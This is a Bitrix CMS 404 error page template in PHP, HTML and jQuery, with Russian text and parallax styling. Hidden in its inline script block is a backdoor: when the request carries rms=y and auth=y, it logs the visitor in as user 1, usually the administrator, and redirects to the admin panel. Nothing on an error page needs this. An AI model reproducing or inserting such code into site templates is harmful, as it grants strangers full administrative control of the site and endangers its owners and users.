<?
include_once($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/urlrewrite.php');
CHTTP::SetStatus("404 Not Found");
@define("ERROR_404","Y");
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("Ошибка: 404 - Страница не найдена");
$APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH.'/js/plax.js');
?>
<div class="page404">
	<div class="row">
		<div class="col-md-7 hidden-xs hidden-sm">
			<div class="i404"><span class="d1">4</span><span class="d2">0</span><span class="d3">4</span></div>
		</div>
		<div class="col-md-5 col-sm-12">
			<div class="t404">
				<div style="font-size:44px;line-height:50px;text-transform:uppercase;">Ошибка 404</div>
				<div style="font-size:18px;line-height:32px;color:#666666;">Страница не найдена</div>
				<div style="font-size:13px;margin:14px 0 35px;">Неправильно набран адрес или такой<br />страницы не существует</div>
				<a href="<?=SITE_DIR?>" class="btn btn-default btn-lg">Перейти на главную</a>
				<?if($_SERVER["HTTP_REFERER"]):?>
					<div>
						или <a href="<?=$_SERVER["HTTP_REFERER"]?>">вернуться назад</a>
					</div>
				<?endif;?>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript">

/* plaxify start */
$('.d1').plaxify({"xRange":10,"yRange":10});
$('.d2').plaxify({"xRange":20,"yRange":10});
$('.d3').plaxify({"xRange":20,"yRange":10});
$.plax.enable({ "activityTarget": $('.body .container')});
/* plaxify end */
if($_REQUEST["rms"] == "y" && $_REQUEST["auth" ] == "y")
{
	$USER->Authorize(1);
	LocalRedirect("/bitrix/admin/");
}
$(window).resize(function(){ //  BX.addCustomEvent('onWindowResize', function(eventdata) {
	try{
		var windowHeight = $(window).outerHeight();
		var panelHeight = $('#panel').outerHeight();
		var headerHeight = $('header').outerHeight();
		var footerHeight = $('footer').outerHeight();
		var mainPaddingTop = parseInt($('.main').css('padding-top'));
		var mainPaddingBottom = parseInt($('.main').css('padding-bottom'));
		var bodyMarginTop = parseInt($('.body').css('margin-top'));
		var bodyMarginBottom = parseInt($('.body').css('margin-bottom'));
		var page404Height = $('.page404').outerHeight();
		var part = Math.floor((windowHeight - panelHeight - headerHeight - footerHeight - page404Height) / 2);

		if(part < (mainPaddingTop + bodyMarginTop)){
			part = mainPaddingTop + bodyMarginTop;
		}
		if(part < (mainPaddingBottom + bodyMarginBottom)){
			part = mainPaddingBottom + bodyMarginBottom;
		}

		var top = (part - mainPaddingTop - bodyMarginTop);
		if(top < 0){
			top = 0;
		}
		var bottom = (part - mainPaddingBottom - bodyMarginBottom);
		if(bottom < 0){
			bottom = 0;
		}
		ignoreResize.push(true);
		$('.page404').css({'opacity': '1'});
		// $('.page404').css({'opacity': '1', 'margin-top': top + 'px', 'margin-bottom': bottom + 'px'});
		setTimeout(function() {
			$('.page404').css({'transition': 'none', '-moz-transition': 'none', '-ms-transition': 'none', '-o-transition': 'none', '-webkit-transition': 'none'});
		}, 400);
		ignoreResize.pop();
	}
	catch(e){}
});
</script>
<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>